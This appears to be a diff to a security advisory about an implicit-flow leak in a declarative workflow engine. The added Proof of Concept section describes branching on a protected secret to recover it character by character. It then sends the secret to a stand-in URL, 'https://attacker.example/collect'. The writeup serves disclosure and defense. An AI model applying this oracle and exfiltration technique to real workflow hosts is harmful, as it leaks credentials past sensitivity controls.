@@ -50,6 +50,8 @@ variable — laundering the protected value into a non-sensitive variable via **
 passing it to any sink. This is a classic implicit-information-flow leak: the documented protected-value
 control is bypassed even though every explicit data-flow sink is guarded.
 
+![Every data sink rejects a Sensitive value; ConditionGroupExecutor evaluated the condition with no sensitivity guard.](images/01-the-boundary.png)
+
 ## Attacker model
 
 Identical to GHSA-9f26 (which Microsoft accepted and rated High): a host runs a declarative workflow
@@ -67,6 +69,27 @@ a `ConditionGroup` oracle emits a secret-dependent value past the sink guard; th
 recovered character-by-character; and a single workflow reconstructs the whole secret into a non-sensitive
 variable and forwards it in one `HttpRequestAction` to an attacker-controlled URL — one-shot exfiltration over
 the same external-send channel class as GHSA-9f26.
+
+## Proof of Concept / Exploitation
+
+The PoC ([`poc/`](poc/)) runs against the published NuGet package 1.24.0 with no network and a fabricated
+secret. The secret never flows to a sink *directly*; it only ever **steers a branch**, and a plain literal
+written inside the taken branch carries it out.
+
+![The secret steers a branch; a literal written inside it is tagged None and emitted, then recovered char-by-char and exfiltrated.](images/02-laundering.png)
+
+A three-scenario differential isolates the defect to control flow:
+
+![A direct and B derived are BLOCKED; C, the ConditionGroup oracle, is EMITTED.](images/03-differential.png)
+
+- **A — direct use** (`SendActivity "{Env.API_SECRET}"`): **BLOCKED** — "Cannot send sensitive activity text".
+- **B — derived value** (`Left(Env.API_SECRET, 2)` → sink): **BLOCKED** — sensitivity propagates through data flow.
+- **C — ConditionGroup oracle** (branch on the secret → assign a literal → sink): **EMITTED** `OUT=prefix_is_sk_live`.
+
+A and B prove the data-flow boundary is active; C proves it is blind to control flow. Repeating C as an oracle
+recovers the full secret character-by-character (`recovered = "sk_live_SECRETBIT", match=True`), and a single
+workflow forwards it in one `HttpRequestAction` to `https://attacker.example/collect?d=<secret>`. Full captured
+output and per-scenario evidence are in [`poc/`](poc/); a narrative walk-through is in [WRITEUP.md](WRITEUP.md).
 
 ## The fix
 
